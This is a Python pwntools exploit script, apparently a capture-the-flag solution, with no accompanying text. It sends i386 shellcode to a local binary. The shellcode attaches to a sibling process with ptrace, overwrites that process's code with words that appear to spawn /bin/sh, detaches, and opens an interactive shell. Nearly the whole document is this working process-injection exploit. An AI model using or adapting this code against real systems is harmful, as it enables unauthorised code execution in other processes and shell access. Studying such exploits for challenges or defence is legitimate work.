from pwn import *
#context.log_level = 'debug'

pid_addr = 0x804a0c8
code_addr = 0x080489a3
get_pid = asm('mov edi,[%d]'%pid_addr)
get_pid += asm('add edi, 1')

shellcode = ''
shellcode += get_pid
shellcode += asm(shellcraft.i386.linux.ptrace(0x10, 'edi', 0,0))                      

shellcode += asm(shellcraft.i386.linux.waitpid(-1,0,2))

shellcode += get_pid
shellcode += asm(shellcraft.i386.linux.ptrace(5, 'edi', code_addr + 4*0, 795371626))

shellcode += get_pid
shellcode += asm(shellcraft.i386.linux.ptrace(5, 'edi', code_addr + 4*1, 1752379183))

shellcode += get_pid
shellcode += asm(shellcraft.i386.linux.ptrace(5, 'edi', code_addr + 4*2, 1852400175))

shellcode += get_pid
shellcode += asm(shellcraft.i386.linux.ptrace(5, 'edi', code_addr + 4*3, 2304248682))

shellcode += get_pid
shellcode += asm(shellcraft.i386.linux.ptrace(5, 'edi', code_addr + 4*4, 2580099555))

shellcode += get_pid
shellcode += asm(shellcraft.i386.linux.ptrace(5, 'edi', code_addr + 4*5, 16875725))


shellcode += get_pid
shellcode += asm(shellcraft.i386.linux.ptrace(0x11, 'edi', 0, 0))

t = process('./bin')

t.recvline()
t.sendline(shellcode)

t.interactive()
